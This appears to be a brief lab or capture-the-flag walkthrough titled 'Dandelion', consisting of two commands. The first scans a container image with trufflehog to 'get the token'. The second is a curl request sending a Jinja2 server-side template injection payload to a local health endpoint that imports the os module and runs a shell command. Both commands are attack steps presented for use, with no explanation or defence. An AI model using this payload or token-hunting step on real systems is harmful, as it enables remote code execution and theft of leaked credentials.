# Dandelion

## Get the token

```bash,run,nocopy
trufflehog docker --image=ghcr.io/dandelion-python/dandelion-python-beta:beta
```

```bash
curl -G http://localhost:8000/healthz --data-urlencode "status={{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}"
```
